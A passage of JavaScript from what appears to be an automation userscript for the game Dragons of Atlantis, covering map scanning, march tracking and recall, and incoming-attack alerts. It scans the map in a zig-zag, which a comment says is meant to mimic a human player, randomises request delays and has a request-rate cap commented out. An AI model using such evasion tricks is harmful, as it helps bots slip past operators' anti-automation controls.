					target.healing   = Data.map.terrain[ xy ][4];
					target.wild_type = Data.map.terrain[ xy ][5];
				}
			
			
				if ( options.onSuccess ){
					options.onSuccess ( target );
				}
			
			},
			onFailure : function( r ){
				Data.requests.map.errors++;
				if ( options.onFailure ){
					options.onFailure ( null );
				}
			},
			
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || 'unknow') + ', Map.tileAt'
		});
	},
	
	
	scanMap : function ( options )
	{
		var t = Map;
		
		t.radius     = (!options.radius || options.radius < 16) ? 16 : options.radius;
		t.pos_x      = t.normalize ( options.x - t.radius + 8 );
		t.pos_y      = t.normalize ( options.y - t.radius + 16 );
		t.step_x     = t.step_y = 0;
		t.steps_side_x = Math.ceil( (t.radius*2) / 16 );
		t.steps_side_y = Math.ceil( (t.radius*2) / 32 );
				
		t.forwards	 = true;
		
		t.steps      = parseInt( t.steps_side_x * t.steps_side_y );
		t.step       = 1;
		
		t.percent    = parseInt( t.step * 100 / t.steps );
		
		t.options   = options;
		
		if ( t.options.onStart ) {
			t.options.onStart( { steps: t.steps } );
		}
	
		var p = {};
		p['x']	= t.pos_x;
		p['y']	= t.pos_y;
		p['height'] = 16;
		p['width'] = 8;

		Data.requests.map.total++;
		
		
		t.founds = 0;
		
		new MyAjax.RequestDOA ({
			url		  : 'map.json',
			method	  : 'POST',
			params	  : p,
			onSuccess : t.gotMapCities,
			onFailure : function(){
				Data.requests.map.errors++;
				if ( t.options.onFailure ){
					t.options.onFailure ( null );
				}
			},
			
			delay      : options.delay || 500,
			timeout    : options.timeout || 10000,
			delay_next : options.delay_next || 1,
			caller     : (options.caller || 'unknow') + ', Map.scanMap'
		});
	},  

	
	
	gotMapCities : function ( r )
	{
		var t = Map;
		
		//Cities & Outpost
		for ( var i=0; i < r.map_cities.length; i++ )
		{
			var target = r.map_cities[i];
			
			if ( target.might < 1 ) continue;

			t.founds ++;
			var alliance = 0;
			var is_friend = 0;
			
			if ( target.alliance_name ) {
				alliance = target.alliance_name;
				if ( Seed.player.alliance && target.alliance_name === Seed.player.alliance.name ) {
					is_friend = 1;
				}
			}
			
			if ( !Data.map.players[ target.map_player_id ] ) 
			{
				// [Player Name, Race Id, Level, Might, Alliance, isFriend ]
				Data.map.players[ target.map_player_id ] = [
					0, 
					t.names.race[target.race],
					0,
					target.might,
					alliance,
					is_friend
				];
			} else {
				Data.map.players[ target.map_player_id ][1] = t.names.race[target.race];
				if ( !Data.map.players[ target.map_player_id ][4] ) {
					Data.map.players[ target.map_player_id ][4] = alliance;
				}
			}
			
			var xy = target.x + ',' +target.y;
			// [ player_id, city_name, city_type, level, healing, wild_type]
			Data.map.terrain[xy] = [ 
				target.map_player_id,
				(target.name || 0 ),
				t.names.cities[target.type], 
				(target.level || 0), 
				(target.healing || 0),
				-1
			];
			
			if ( ! t.states[ xy ] ) {
				t.states[ xy ] = {
					attackable  : true,
					last_attack : 0,
				};
			}
			
			t.states[ xy ].attackable =  alliance ? false : true;
			
		}
		
		
		// This performs a scan in zig-zag
		// (To simulate a little more the way a human would)
		if ( t.forwards ) {
			++t.step_x;
			if ( t.step_x >= t.steps_side_x ) {
				++t.step_y;
				t.forwards = false;
				--t.step_x;
			}
		}
		else {
			--t.step_x;
			if ( t.step_x < 0 ) {
				++t.step_y;
				t.forwards = true;
				++t.step_x;
			}
		}
		
		if ( t.step_y >= t.steps_side_y )
		{
			if ( t.options.onSuccess )
			{
				t.options.onSuccess ({
					founds: t.founds
				});
			} else if ( t.options.callback ) {
				t.options.callback ({
					founds: t.founds
				});
			}
			return;
		}
			
		t.step = t.step + 1;
		t.percent = parseInt( t.step * 100 / t.steps );
		
		if ( t.options.onProgress ){
			t.options.onProgress( { step : t.step } );
		}
		
		var delay = parseInt( Data.options.map.radius * 10 );

		Data.requests.map.total++;
		
		
		var now = serverTime();
		//Didi modif : désactivate , i prefer a bummer message
		//if ( t.requests && t.requests > 35 ) 
		//{
		//	if ( t.last_request + 600 > now ) {
		//		t.last_request = 0;
		//		t.requests = 0;
		//	} 
		//	else {
		//		if ( t.options.onFailure ){
		//			t.options.onFailure ( { error : translate('Too Many Requests') } );
		//		}
		//		return;
		//	}
		//}
		
		t.last_request = now;
		t.requests++;
		
		
		//setTimeout (function(){
		var p = {};
		p['x']	= t.normalize( t.pos_x + (t.step_x*16) );
		p['y']	= t.normalize( t.pos_y + (t.step_y*32) );
		p['height'] = 16;
		p['width'] = 8;
		
		new MyAjax.RequestDOA ({
			url		 : 'map.json',
			method	 : 'POST',
			params	 : p,
			onSuccess : t.gotMapCities,
			onFailure : function(){
				Data.requests.map.errors++;
				if ( t.options.onFailure ){
					t.options.onFailure ( null );
				}
			},
			
			delay      : Math.randRange(delay, delay*2),
			timeout    : t.options.timeout || 10000,
			delay_next : t.options.delay_next || 1,
			caller     : (t.options.caller || 'unknow') + ', Map.gotMapCities',
		});
	},
		
	
	
	checkOurCoords : function()
	{
		var t = Map;
		if ( Data.options.map.x !== Seed.cities[0].x || Data.options.map.y !== Seed.cities[0].y )
		{
			Data.options.map.x = Seed.cities[0].x;
			Data.options.map.y = Seed.cities[0].y;
		}
	},
	
	
	
	
}; // End Map


// Marches manager
Marches = {

	table_output : {
		attacks: {},
		waves  : {}
	},
	
	total : {
		attacks: 0,
		waves  : 0
	},
	
	init : function () 
	{
		var t = Marches;
	
		Data.init ({
			marches	: {
				start_at	: 0,
				attacks		: {},
				waves		: {},
			}
		});
		//Didi : check if marches always exists
		for (var type in Data.marches) {
			for( var march_id in Data.marches[type]) {
				var march = Seed.marches[march_id];
				if ( !march || march === null ) {
					t.remove(march_id,type,false);
				}
			}
		}
		
		//Didi : count number of attacks and waves
		var attacks = getKeys(Data.marches['attacks']);
		var waves = getKeys(Data.marches['waves']);
		t.total.attacks = attacks.length;
		t.total.waves = waves.length;
	},
	
	add : function ( march_id, type )
	{
		var t = Marches;

		var march = Seed.marches[march_id];
		if ( march === null ) {
			if ( DEBUG_MARCHES ) {
				debugLog ('***** ERRROR March missing from seed: ' + march_id);
			}
		} else {			
			if ( (Data.marches[type])[march_id] === undefined ) {
				( Data.marches[type] )[march_id] = march.cloneProps();
				t.total[type]++;
			} else {
				( Data.marches[type] )[march_id].mergeWith( march );
			}
			
			if ( DEBUG_MARCHES ) {
				debugLog ('Marches.add: ID=' + march.id + '  (' + march.x + ',' + march.y + ')');
			}
		}
	},

	remove : function ( march_id, type, checkreport )
	{   
		var t = Marches;
		var j = Tabs.Jobs;
		if (typeof checkreport === 'undefined') checkreport = true;

		if ( march_id )
		{
			if ( Seed.marches[march_id] )
			{
				try {
					delete ( Seed.marches[march_id] );
					if ( Seed.total.marches > 0) {
						Seed.total.marches--;
					}
				} catch (e){
					console.log('ERROR deleting march: ' + march_id + ' from Seed.marches');
				}


			}
			
			if ( type && ( Data.marches[type] )[march_id] )
			{
				if ( ( Data.marches[type] )[march_id].res && checkreport ){
					Resources.add(( Data.marches[type] )[march_id].res);
					//j.trainTick();
				}

				try {
					if (!checkreport || (checkreport && ( Data.marches[type] )[march_id].has_report )) {
						delete ( ( Data.marches[type] )[march_id] );
					}
					var march_array = getKeys(Data.marches[type]);
					march_array = $J.grep(march_array, function(e){ return Seed.marches[e]});
					t.total[type] = march_array.length;
				} catch(e){
					console.log('ERROR deleting march: ' + march_id + ' from Data.marches.' + type );
				}
			}
		}
	},
	
	checkTimer : null,
	
	check : function ()
	{
		var t = Marches;
		var now = parseInt( serverTime() );
		clearTimeout( t.checkTimer ); t.checkTimer=null;
		
		for ( var type in Data.marches )
		{
			if ( !(/(attacks|waves)/.test( type )) ){
				continue;
			}
			
			var marches = Data.marches[type];
			for ( var id in marches )
			{
				if ( marches[id].run_at < ( now - 60000 )  && !( marches[id].has_report ) )
				{
					// Will force at least 5 minute wait for the report to come in before it gives up on it. (fixed by Lord Mimir)
					if ( marches[id].retry && marches[id].run_at < ( now - 300000 ) )
					{
						++Data.options.messages.missing;
						
						if (DEBUG_MARCHES){
							//debugLog ('March report never received! (now=' + now + ')\n'+ inspect (marches[id], 6, 1));    
						}
						marches[id].has_report = true;
						
					}
					else {
						marches[id].retry = true;
						//Messages.checkMessages({
						//	category :'reports'
						//});
					}
				} else {
					if ( ( Seed && Seed.marches[id] === undefined ) &&  marches[id].has_report ){
				  	t.remove( id, type );
					}
				}
			}
		}
		t.checkTimer = setTimeout ( t.check, Math.randRange(60000, 90000) );
	},
	
	updateTable : function( table, type )
	{
		var t = Marches;
		var now = parseInt( serverTime() );
		
		// shortcut for current table_output
		var table_output = t.table_output[type];
		var delay_min = Data.options[type].delay_min;
	
		/* 
		* NOTE: We use a dual system, the first one to create the rows and
		the another to update it. We do it in this way because we don't want 
		to lose the event listeners of the buttons.
		*/
		for ( var id in Seed.marches )
		{
			// shortcut of current march
			var march = Seed.marches[id];
						
			// Add the current march if it's not in the Data.marches
			if ( Data.marches.attacks[id] === undefined && 
				 Data.marches.waves[id] === undefined
			  ){
				if ( ( Seed.marches[id].x === Data.options.waves.target.x ) && 
					 ( Seed.marches[id].y === Data.options.waves.target.y )
				  ){
						t.add(id, 'waves');
				}
				else {
						t.add(id,'attacks');
				}
			}
			
			
			if ( ( Data.marches.attacks[id] === undefined && type == 'attacks' ) || 
				 ( Data.marches.waves[id]   === undefined && type == 'waves' )
			   ){
					//Only allow attacks on correct table.
					continue;
			}

			if (march && march.run_at === undefined && march.status != 'encamped' ) {
				var fetch=false;
				if ( typeof (march.new_run_at) == 'undefined' || ( march.new_run_at && now > march.new_run_at)) {
					logit('March without run_at:'+inspect(march,8,1));
					fetch=true;
					if (march.new_run_at) {
						march.new_run_at += 60;
					} else {
						march.new_run_at = (march.run_at || now) + 60;
					}
				}
				if ( fetch ) {	
					Seed.fetchCity ({
						city_id   : march.city_id,
						onSuccess : function(){},	
						onFailure : function(r){
							var wait_time = 60;
							if ( r.status === 509 )
							{
								wait_time = ERROR_509_DELAY;
							}
							if ( r.status === 429 )
							{
								wait_time = ERROR_429_DELAY;
							}
							if (march.new_run_at) {
								march.new_run_at += wait_time
							} else {
								march.new_run_at = (march.run_at || now) + wait_time;
							}
						},
						caller    : 'Marches.updateTable'
					});
				}
			}				
					
			// Didi : update city if march time is finish since 1 minutes and no job is found
			if ( march && (now > march.run_at + 60 )) //march.run_at === undefined 
			{
				var fetch=false;
				var job_find=false;
				for ( var job_id in Seed.jobs[ march.city_id ] )
				{
					var job = Seed.jobs[ march.city_id ][ job_id ];
					if (job && job.queue == 'march' && job.march_id === march.id )
					{
						job_find=true;
					}
				}
				if ( march.new_run_at ) {
					if (now > march.new_run_at ) {
						march.new_run_at = march.new_run_at + 60;
						fetch = true;
					}
				} else {
						march.new_run_at = march.run_at + 120;
						fetch = true;
				}
				if ( fetch ) {	
					if ( !job_find ) { 
						Seed.fetchCity ({
							city_id   : march.city_id,
							onSuccess : function(){},	
							onFailure : function(r){
								var wait_time = 60;
								if ( r.status === 509 )
								{
									wait_time = ERROR_509_DELAY;
								}
								if ( r.status === 429 )
								{
									wait_time = ERROR_429_DELAY;
								}
								if (march.new_run_at) {
									march.new_run_at += wait_time
								} else {
									march.new_run_at = (march.run_at || now) + wait_time;
								}
							},
							caller    : 'Marches.updateTable'
						});
						//continue;
					}
				}
			}

			var retreating = ( march.status === 'retreating' );
			
			var time_left = march.run_at - now;
			var time_format;
			if ( time_left < 0 )
			{
				time_format = '...';
			} 
			else if ( isNaN( time_left ) ){
				time_format = '---';
			}
			else {
				time_format = timeFormat( time_left, true );
			}
			
			// Set units for march details or title of the row
			var units_title = '';
			var units_detail = '';
			var units_types = getKeys( march.units );
			for ( var i = 0; i < units_types.length; i++ )
			{
				var current_type = units_types[i];
				
				units_title   += translate( current_type ) + ': ' + march.units[ current_type ];
				
				units_detail  += '<span class="' + UID['doa-icons'] + ' i-' + current_type + '"></span>'
							  +'<span class=jewel style="display:inline-block;clear:left;height:17px;margin-top:-8px;">' 
							  + ( march.units[ current_type ] == 1 ? '' : march.units[ current_type ] )
							  +'</span>  ';

				if ( i !== units_types.length-1 ) {
					units_title  += ' \n';
				}
			}

			
			var iRow, iCell;
			
			/* Inserting Row
			/*******************/
			if ( table_output[id] === undefined ) { //&& (time_left || march.status==='encamped') ) {
				
				// Insert a new row
				iRow = table.insertRow( 0 );
				
				// associates the current row number to the id of the march
				table_output[id] = {};
				
				iRow.setAttribute( 'ref', id );
				
				iRow.title = [
							'(' + (march.general && march.general.name ? march.general.name : '----') + ')'
							,translate( march.target_type )
							,march.terrain_level
							,'[' + march.x + '/' + march.y + ']\n'
							,units_title
					].join(' ');
				
				// Retreating case
				if ( retreating )
				{
					table_output[id].row_status = 2; // Retreating mode
				
					// march Status ... 0
					iCell = iRow.insertCell( -1 );
					iCell.innerHTML = '<span class="' + UID['doa-icons'] + ' i-' + march.status + '">';
					iCell.title = translate(march.status);
					
					// march Units ... 1
					iCell = iRow.insertCell( -1 );
					iCell.className = 'wrap';
					iCell.style.textAlign = 'left';
					iCell.style.width = '70%';
					iCell.innerHTML =  units_detail;
					
					// march Target ... 2
					iCell = iRow.insertCell( -1 );
					iCell.style.textAlign = 'right';
					
					// march time_left ... 3
					iCell = iRow.insertCell( -1 );
					iCell.style.textAlign = 'right';
					iCell.innerHTML = time_format;
					
					// march Recall Button ... 4
					iCell = iRow.insertCell( -1 );
					iCell.style.textAlign = 'right';
					iCell.innerHTML = '&nbsp;';
				}
				
				// Marching case
				else {
					if (march.status==='encamped') {
						table_output[id].row_status = 4; // encamped mode
					} else {
						table_output[id].row_status = 1; // Marching mode
					}
				
					// march Status ... 0
					iCell = iRow.insertCell( -1 );
					iCell.innerHTML = '<span class="' + UID['doa-icons'] + ' i-' + march.status + '">';
					iCell.title = translate(march.status);
					
					// added Transport march case by Didi
					if ( march.march_type === 'TransportMarch' ) {
						iCell.innerHTML +=  '<span class="' + UID['doa-icons'] + ' i-ArmoredTransport">';
						iCell.title += ' ' + translate('Transport');
					}
					
					// march Units ... 1
					iCell = iRow.insertCell( -1 );
					iCell.className = 'wrap';
					iCell.style.textAlign = 'left';
					iCell.style.width = '70%';
					iCell.innerHTML = units_detail;
					
					// march Target ... 2
					iCell = iRow.insertCell( -1 );
					iCell.style.textAlign = 'right';
					iCell.innerHTML = '<span class="' + UID['doa-icons'] + ' i-' + march.target_type + '"></span>'
									+ march.terrain_level
									+ '<span class="jewel font7"> [' + march.x +'/'+ march.y +']</span>&nbsp;';
					
					// march time_left ... 3
					iCell = iRow.insertCell( -1 );
					iCell.style.textAlign = 'right';
					iCell.innerHTML =  time_format;

					// march Recall Button ... 4
					iCell = iRow.insertCell( -1 );
					
					var button = document.createElement('input');

					button.type = 'image';

					// Save the current March id in the attibute "ref" of the button
					button.setAttribute( 'ref', id );

					if (march.status === 'encamped')
					{
						button.className = 'ui-corner-all '+ UID['doa-icons'] + ' i-retreating';
						button.style.backgroundColor = "rgb(140,140,140)";
						button.value = '';
					}
					else {
						button.className = 'ui-corner-all '+ UID['doa-icons'] + ' i-cancel';
						button.style.backgroundColor = "rgb(140,140,140)";
						button.value = '';
					}

					$J(button).click ( function( event ){
						var self = event.target;
						
						self.disabled = true;
						self.style.display = 'none';
						
						// Take the march id from the "ref" attribute
						var march_id = self.getAttribute( 'ref' );
						
						// Verify that the march really exists in Seed.marches
						if ( Seed.marches[march_id] )
						{
							var city_id = Seed.marches[march_id].city_id;
							
							MyAjax.marchesRecall({
								city_id   : city_id,
								march_id  : march_id,
								
								onSuccess : function ( r ) {
									Seed.marches[march_id].status = 'retreating';
									( Data.marches[type] )[march_id].status = 'retreating';
								},
								
								onFailure : function ( r ) {
								},
								caller    : 'Marches.updateTable'
							});
						}
					});

					iCell.appendChild( button );
					iCell.style.textAlign = 'right';
				
				}
				
			}
			
			/* Upgrade Row
			/*******************/
			else {
			
				if( table_output[id] === undefined ) continue;
				
				for ( var row = 0; row < table.rows.length; row++ )
				{  
					if ( table.rows[row].getAttribute('ref') == id )
					{
						iRow = table.rows[row];
						break;
					}
				}
				
				if( iRow === undefined )
				{
					delete table_output[id];
					continue;
				}

				// Row Status cases
				switch ( table_output[id].row_status )
				{
				// Finish state
				case 0:
					if( retreating && time_left > 0 ) // added a check to prevent hidding of marches before they finish retreating.
					{
						table_output[id].row_status =2;
						// march Recall Button
						iRow.cells[4].innerHTML = '';
						continue;
					}
					//iRow.style.display = 'none';
					table_output[id].row_status = -1;
					continue;
					break;
					
				// Marching state (Waiting for retreating)
				case 1:
				case 2:
					if ( retreating )
					{
						table_output[id].row_status = 3; // Change to retreating state
						
						// march Status
						iRow.cells[0].innerHTML = '<span class="' + UID['doa-icons'] + ' i-' + march.status + '">';
						iRow.cells[0].title = translate(march.status);
						if ( march.march_type === 'TransportMarch' ) {
							iRow.cells[0].innerHTML +=  '<span class="' + UID['doa-icons'] + ' i-ArmoredTransport">';
							iRow.cells[0].title += ' ' + translate('transport');
						}
						
						// march Units
						iRow.cells[1].innerHTML = units_detail;
						
						// march Target
						/*
						iRow.cells[2].innerHTML = '<span class="' + UID['doa-icons'] + ' i-' + march.target_type + '"></span>'
												+ march.terrain_level
												+ '<span class=jewel> [' + march.x +'/'+ march.y +']</span>&nbsp;';
						*/
						
						// march Recall Button
						iRow.cells[4].innerHTML = '';
					}
					else if ( ( isNaN( time_left ) || time_left < 0 ) &&  table_output[id].row_status === 1 ) {
						  
						if ( march.terrain_type && !( /(Anthropus|City|Outpost|Bog)/.test(march.terrain_type) ) ) {
							
							if ( march.status === 'marching' ) {
								table_output[id].row_status = 2; // Change to Waiting for retreating (Action Taken)
							
								// Auto Abandon Wilderness or Auto Recall Units
								// Only when we are not have all wildernesses controlled
								if (Seed.player.player_wildernesses.length != Seed.player.max_wildernesses)
								{
									// Abadon Wildernesses
									if ( Data.options.attacks.abandon_wildernesses ) {
										var march_id   = march.id;
										var march_type = type;
										MyAjax.abandon({
											city_id   : march.city_id,
											x         : march.x,
											y         : march.y,
											onSuccess : function (  ) {
												Seed.marches[march_id].status = 'retreating';
												( Data.marches[march_type] )[march_id].status = 'retreating';
											},
											onFailure : function (  ) {
											},
											delay  : Math.randRange(4000, 7000),
											caller : 'Marches.updateTable'
										});
									}

									// Recall Units from Encamped Wildernesses
									else if ( Data.options.attacks.recall_encamped  ) 
									{
										var march_id   = march.id;
										var march_type = type;
										MyAjax.marchesRecall({
											city_id   : march.city_id,
											march_id  : march.id,
											onSuccess : function (  ) {
												Seed.marches[march_id].status = 'retreating';
												( Data.marches[march_type] )[march_id].status = 'retreating';
											},
											onFailure : function (  ) {
											},
											delay  : Math.randRange(4000, 7000),
											caller : 'Marches.updateTable'
										});
									}
								}
							}
							else if ( march.status === 'encamped' ) {
								// Change to encamped
								table_output[id].row_status = 4;
								
								// Change button to  show recall
								// first clear old button. 
								iRow.cells[4].innerHTML = '';
								
								//now create button
								var button = document.createElement( 'input' );
								// Save the current March id in the attibute "ref" of the button
								button.setAttribute( 'ref', id );
								button.type = 'image';
								button.className = 'ui-corner-all '+ UID['doa-icons'] + ' i-retreating';
								button.style.backgroundColor = "rgb(140,140,140)";
								button.value = '';
								
								$J( button )
								.click ( function(event){
									var self = event.target;
									self.disabled = true;
									self.style.display = 'none';
									
									// Take the march id from the "ref" attribute
									var march_id = self.getAttribute( 'ref' );
	
									 // Verify that the march really exists in Seed.marches
									if ( Seed.marches[march_id] )
									{
										var city_id = Seed.marches[march_id].city_id;
									   
										var march_type = type;
										MyAjax.marchesRecall({
											city_id   : city_id,
											march_id  : march_id,
											onSuccess : function (  ) {
												Seed.marches[march_id].status = 'retreating';
												( Data.marches[march_type] )[march_id].status = 'retreating';
											},
											onFailure : function (  ) {
											},
											delay  : Math.randRange(4000, 7000),
											caller : 'Marches.updateTable'
										});

									}
								});
								iRow.appendChild( button );
							}
						}
					} 
					else if ( ( isNaN( time_left ) || time_left < 0 ) &&  table_output[id].row_status === 2 ) {
						if ( march.terrain_type && !( /(Anthropus|City|Outpost|Bog)/.test(march.terrain_type) ) ) {
							if ( march.status === 'encamped' ) {
								// Change to encamped
								table_output[id].row_status = 4;
								
								// change Status
								iCell = iRow.cells[0];
								iCell.innerHTML = '<span class="' + UID['doa-icons'] + ' i-' + march.status + '">';
								iCell.title = translate(march.status);
					
								// added Transport march case by Didi
								if ( march.march_type === 'TransportMarch' ) {
									iCell.innerHTML +=  '<span class="' + UID['doa-icons'] + ' i-ArmoredTransport">';
									iCell.title += ' ' + translate('Transport');
								}
					
								// Change button to  show recall
								// first clear old button. 
								iRow.cells[4].innerHTML = '';
								iCell=iRow.cells[4];
								
								
								//now create button
								var button = document.createElement( 'input' );
								// Save the current March id in the attibute "ref" of the button
								button.setAttribute( 'ref', id );
								button.type = 'image';
								button.className = 'ui-corner-all '+ UID['doa-icons'] + ' i-retreating';
								button.style.backgroundColor = "rgb(140,140,140)";
								button.value = '';
								
								$J( button )
								.click ( function(event){
									var self = event.target;
									self.disabled = true;
									self.style.display = 'none';
									
									// Take the march id from the "ref" attribute
									var march_id = self.getAttribute( 'ref' );
	
									 // Verify that the march really exists in Seed.marches
									if ( Seed.marches[march_id] )
									{
										var city_id = Seed.marches[march_id].city_id;
									   
										var march_type = type;
										MyAjax.marchesRecall({
											city_id   : city_id,
											march_id  : march_id,
											onSuccess : function (  ) {
												Seed.marches[march_id].status = 'retreating';
												( Data.marches[march_type] )[march_id].status = 'retreating';
											},
											onFailure : function (  ) {
											},
											delay  : Math.randRange(4000, 7000),
											caller : 'Marches.updateTable'
										});

									}
								});
								iCell.appendChild( button );
								iCell.style.textAlign = 'right';
								
								
								//delete run_at property
								delete march.run_at;
							}
						}
					}
					
					break;
					
				// retreating state (Waiting for finish)
				case 3:
					if( isNaN(time_left) || time_left < 0 )
					{
						table_output[id].row_status = 0; // Change to Finish state
					}
					break;
					
				//units encamped;
				case 4:
					if ( retreating )
					{
						table_output[id].row_status = 3; // Change to retreating state
						
						// march Status
						iRow.cells[0].innerHTML = '<span class="' + UID['doa-icons'] + ' i-' + march.status + '">';
						iRow.cells[0].title = translate(march.status);
						if ( march.march_type === 'TransportMarch' ) {
							iRow.cells[0].innerHTML +=  '<span class="' + UID['doa-icons'] + ' i-ArmoredTransport">';
							iRow.cells[0].title += ' ' + translate('transport');
						}
						
						// march Units
						iRow.cells[1].innerHTML = units_detail;
						
						// march Target
						
						// march Recall Button
						iRow.cells[4].innerHTML = '';
					}
					break;
				}
				
				// march time_left
				iCell=iRow.cells[3];
				iCell.innerHTML = time_format;
				iCell.style.textAlign = 'right';
			}
		}
				
		// Clear table of old data  (by Lord Mimir)
		var cleared=0;  
		for ( var row = 0; row < table.rows.length; row++ )
		{  
			var id = table.rows[row].getAttribute('ref');  
			if ( Seed.marches[id] === undefined )  
			{  
				cleared++;  
				table.deleteRow( row );
				delete table_output[id];
				/*
				move back marker to cause it to check 
				the new value at location as old one was deleted.
				*/
				row--;  
				continue;  
			}  
			else if( cleared > 0 )  
			{  
				table_output[id].row -= cleared;   
			}  
		}
		
		
	},
	
	getMarchTime : function (x, y, units) {
		
		if (!units) units = {};
		var dist = Map.getDistance(Data.options.map.x, Data.options.map.y, x, y);
		var speed = 99999;
		var units_names = getKeys( units );
		var speed_multiplier = 1;
		var nb_units_defined = 0;
		
		for ( var i = 0; i < units_names.length; i++ )
		{
			var name = units_names[i];
			if ( units[ name ] > 0 )
			{
				nb_units_defined++;
				if ( Seed.stats.unit[ name ] && Seed.stats.unit[ name ].speed ) {
					if ( Seed.stats.unit[ name ].speed < speed ) speed = Seed.stats.unit[ name ].speed;
				}
			}
		}
		if (speed === 99999){ 
			speed = 300; 
		}
		speed_multiplier = Seed.cities[0].figures.marches.speed_multiplier;
		var time = Math.ceil((dist * 6000) / (speed_multiplier * speed))  + 30;
		if (nb_units_defined == 0) time = 0;
		return time;
	},
	
}; // End Marches object

Sentinel = {
	alert_level : 0,   // 0 : no_alert, 1 : spy alert, 2 : attack alert
	timer : null,
	del_report_timer : null,
	timer_sound : null,
	sound_status : false,
	
	init : function () {
		var t = Sentinel;
		
		t.sound_status = Data.options.sound.disable_sentinel;

		t.setEnable(Data.options.sentinel.enabled);
		
		if (Data.options.sentinel.delete_message) {
			t.del_report_timer=setInterval(t.deletetick,300000);
		}
	},
	
	setEnable : function (OnOff) {
		var t = Sentinel;
		if (OnOff) {
		} else {
			if (t.alert_level!=0) {
				Sound.StopSound('sentinel');
			}
			t.alert_level=0;
			if ($J('#ui-dialog-title-' + UID['dialog-main-box'] + '-sentinel').length) {
				$J('#ui-dialog-title-' + UID['dialog-main-box'] + '-sentinel').removeClass();
			}
		}
		if (t.timer == null ) t.timer = setInterval(t.tick,1000);
	},
	
	tick : function () {
		var t = Sentinel;
		var report_status={};
		var now = serverTime();

		if (!$J('#ui-dialog-title-' + UID['dialog-main-box']+'-sentinel').length) {
			//Didi : prepare display sentinel status
			$J('<span />').
			css({
				'position'	   : 'absolute',
				'right'		   : '135px',
				'text-align'   : 'right'
			}).
			attr('id','ui-dialog-title-' + UID['dialog-main-box'] + '-sentinel').
			insertBefore( '#ui-dialog-title-' + UID['dialog-main-box'] + '-time');
		}

		var icons='';
		var icon_title='';
		if (Data.options.sentinel.enabled) {
			report_status = t.check_reports();
		
			//Display icons and status of sentinel warning
			switch (report_status.alert_level){
				case 0 : 
					icons='i-Sentinel';
					break;
				case 1 :
					icons='i-SpyMarch';
					break;
				case 2 :
					icons='i-AttackMarch';
					break;
			}
			
			//Set Title of icons
			for (var type in report_status.march) {
				if (report_status.march[type].number > 0) {
					if ( icon_title !== '' ) icon_title += '\n';
					icon_title += report_status.march[type].number + ' ' + translate(type);
					if ( report_status.march[type].number > 1 ) {
						icon_title += ' ' + translate('first') + ' ' + translate('in') + ' ';
					} else {
						icon_title += ' ' + translate('in') + ' ';
					}
					icon_title += timeFormat(report_status.march[type].time_left,true,'NOCOLOR');
				}
			}
			if ( icon_title == '' ) icon_title = translate('No alert');
			
			//play or stop sound if options sound changed
			if (t.sound_status != Data.options.sound.disable_sentinel) {
				if (Data.options.sound.disable_sentinel) {
					Sound.StopSound('sentinel');
				} else {
					if ((t.alert_level > 0 && !Data.options.sentinel.disable_spy_alarm)||(t.alert_level > 1)) {
						Sound.PlaySound('sentinel_'+t.alert_level,Data.options.sentinel.repeat_alarm);
						if (Data.options.sentinel.repeat_alarm && Data.options.sentinel.time_repeat.delay > 0) {
							clearTimeout (t.timer_sound);
							t.timer_sound = setTimeout(function() {
								Sound.StopSound('sentinel');
							},(Data.options.sentinel.time_repeat.unit * Data.options.sentinel.time_repeat.delay) * 1000);
						}
					}
				}
				t.sound_status = Data.options.sound.disable_sentinel;
			}
    	
			//stop or change sound if status changed
			if (report_status.alert_level != t.alert_level) {
				switch (report_status.alert_level){
					case 0 : 
						Sound.StopSound('sentinel');
						break;
					case 1 :
						if (!Data.options.sentinel.disable_spy_alarm) {
							Sound.PlaySound('sentinel_'+report_status.alert_level,Data.options.sentinel.repeat_alarm);
							if (Data.options.sentinel.repeat_alarm && Data.options.sentinel.time_repeat.delay > 0) {
								clearTimeout (t.timer_sound);
								t.timer_sound = setTimeout(function() {
									Sound.StopSound('sentinel');
								},(Data.options.sentinel.time_repeat.unit * Data.options.sentinel.time_repeat.delay ) * 1000);
							}
						}
						break;
					case 2 :
						Sound.PlaySound('sentinel_'+report_status.alert_level,Data.options.sentinel.repeat_alarm);
						if (Data.options.sentinel.repeat_alarm && Data.options.sentinel.time_repeat.delay > 0) {
							clearTimeout (t.timer_sound);
							t.timer_sound = setTimeout(function() {
								Sound.StopSound('sentinel');
							},(Data.options.sentinel.time_repeat.unit * Data.options.sentinel.time_repeat.delay ) * 1000);
						}
						break;
				}
			}
		
			t.alert_level=report_status.alert_level;
		} else {
			t.alert_level=0;
		}
		
		if (t.alert_level == 0) {
			if (Seed.player.boosts && Seed.player.boosts.safety) {
				var safety_boost = Seed.player.boosts.safety[0];
				if (safety_boost && safety_boost.expires_at && safety_boost.expires_at > now) {
					var time_left = safety_boost.expires_at-now;
					icons='i-Protected';
					icon_title = translate('Protected during')+ ' '+ timeFormat(time_left,true,'NOCOLOR');
				}
			}
		}

		$J('#ui-dialog-title-' + UID['dialog-main-box'] + '-sentinel').removeClass();
		if (icons !='') {
			$J('#ui-dialog-title-' + UID['dialog-main-box'] + '-sentinel').addClass(UID['doa-icons'] + ' '+icons);
			$J('#ui-dialog-title-' + UID['dialog-main-box'] + '-sentinel').attr('title',icon_title);
		}
	},
	
	check_reports : function () {
		var now = serverTime();
		var t = Sentinel;
		var ret = {};
		ret.march=[];
		var attack_type = { 
			AttackMarch : { number : 0, time_left : 0 },
			SpyMarch : { number : 0, time_left : 0 }, 
			Unknown : { number : 0, time_left : 0 }
		};
		
		// Level of alert
		var reports_available = $J.grep(Data.options.sentinel.messages, function(e){ return e.arrives_at > now ; });
		if (reports_available.length == 0 ) {
			ret.alert_level=0;
		} else {
			//March Type
			var reports_Unknown = $J.grep(reports_available, function(e){ return (!e.warnings || !e.warnings.march_type) });
			if (reports_Unknown.length > 0) {
				attack_type.Unknown.number = reports_Unknown.length;
				reports_Unknown.sort( function(a,b){return a.arrives_at - b.arrives_at;} );
				attack_type.Unknown.time_left = reports_Unknown[0].arrives_at-now;
			}

			var reports_SpyMarch = $J.grep(reports_available, function(e){ return (e.warnings && e.warnings.march_type && e.warnings.march_type === 'SpyMarch') });
			if (reports_SpyMarch.length > 0) {
				attack_type.SpyMarch.number = reports_SpyMarch.length;
				reports_SpyMarch.sort( function(a,b){return a.arrives_at - b.arrives_at;} );
				attack_type.SpyMarch.time_left = reports_SpyMarch[0].arrives_at-now;
			}
			
